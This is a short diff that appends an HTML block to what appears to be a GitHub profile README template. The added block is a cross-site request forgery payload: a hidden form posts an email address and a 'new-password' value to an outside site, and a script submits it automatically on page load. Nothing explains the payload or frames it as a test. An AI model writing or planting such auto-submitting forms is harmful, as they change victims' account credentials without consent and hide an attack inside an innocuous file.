@@ -14,3 +14,16 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
+
+
+<html>
+  <body>
+    <form action="https://heise.de" method="POST">
+      <input type="hidden" name="email" value="me@mail.com" />
+      <input type="hidden" name="new-password" value="Some Password" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
